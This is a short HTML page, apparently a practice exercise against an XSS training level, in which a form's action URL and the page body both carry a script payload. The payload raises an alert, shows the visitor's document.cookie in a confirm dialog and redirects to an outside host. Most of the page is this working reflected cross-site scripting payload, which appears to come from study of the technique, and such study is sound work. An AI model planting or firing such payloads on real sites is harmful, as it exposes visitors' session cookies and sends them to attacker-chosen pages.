<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title></title>
  </head>
<body>
    <script src="analytics.js">
    </script>
<form action=http://sudo.co.il/xss/level0.php?email=%3Cscript%3E%20alert(%27This%20is%20XSS%20is%20crafted%20by%20pravin%20shinde%27);%20if%20(window.confirm(document.cookie)){%20document.location.href%20=%20%22http://blackhat.com%22;%20}%20%3C/script%3E method="get">
<input type="text" name="email"><input type="submit" value="Subscribe!">
</form>
Thank you for subscription!<br>
Email <b><script> alert('This is XSS is crafted by Pravin Shinde'); if (window.confirm(document.cookie)){ document.location.href = "http://blackhat.com"; } </script></b> added to mailing list!
</body>

</html>
